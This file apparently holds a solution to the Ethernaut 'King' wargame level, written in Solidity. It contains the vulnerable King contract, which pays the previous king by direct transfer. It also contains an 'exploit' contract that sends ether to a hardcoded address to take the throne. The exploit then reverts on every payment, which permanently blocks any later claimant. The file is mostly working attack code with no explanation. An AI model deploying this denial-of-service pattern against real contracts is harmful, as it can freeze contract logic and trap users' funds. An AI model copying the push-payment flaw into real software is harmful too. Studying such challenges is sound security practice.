// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract exploit {
    King target = King(payable(0x543AB4abF01065F9d88895B53E4d5e14f020ee81));

    constructor() payable {
        payable(target).call{value: msg.value}("");    
    }
    receive() external payable {
        revert();
    }
}